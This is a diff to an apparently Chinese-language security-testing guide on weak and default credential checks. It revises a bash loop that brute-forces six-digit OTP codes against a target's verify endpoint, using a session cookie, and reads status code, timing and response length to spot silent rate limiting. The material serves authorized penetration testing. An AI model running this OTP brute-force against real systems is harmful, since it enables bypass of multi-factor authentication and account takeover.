@@ -25,14 +25,19 @@ description: 需要对登录面做弱口令/默认口令检测(模式口令、�
 
 影子限流检测器:在已知位置埋真值, 负载下确认它仍有效:
 ```bash
-# 种子: 爆破集第 500 位放自己测试账号的真 OTP
-# 循环跑到 500 时若正确码不再通过 → 端点在静默丢弃, 不是无防护
+# 种子: 爆破集第 500 位放自己测试账号的真 OTP。
+# 循环跑到 500 时若正确码不再通过 → 端点在静默丢弃, 不是无防护。
 KNOWN_GOOD="123456"   # 自己测试账号的当前真 OTP
 for n in $(seq 0 600); do
   CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
-  curl -s -o /dev/null -w "%{http_code} " -d "code=$CODE" http://target/otp-verify
+  CODE_RESP=$(curl -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
+    -X POST "https://$TARGET/api/verify-otp" \
+    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
+    -d "{\"otp\":\"$CODE\"}")
+  echo "$n $CODE $CODE_RESP $(wc -c </tmp/bf_body)"
 done
-# 末尾观察第 500 发是否仍 200——是=无影流, 否=影子限流(换源/换面)
+# 盯三列信号: 状态码, time_total, 响应体长度。
+# 状态码不变而 time_total 爬升 或 响应体长度漂移 = 影子限流。
 ```
 
 ## 2. 目标选择(优先级)
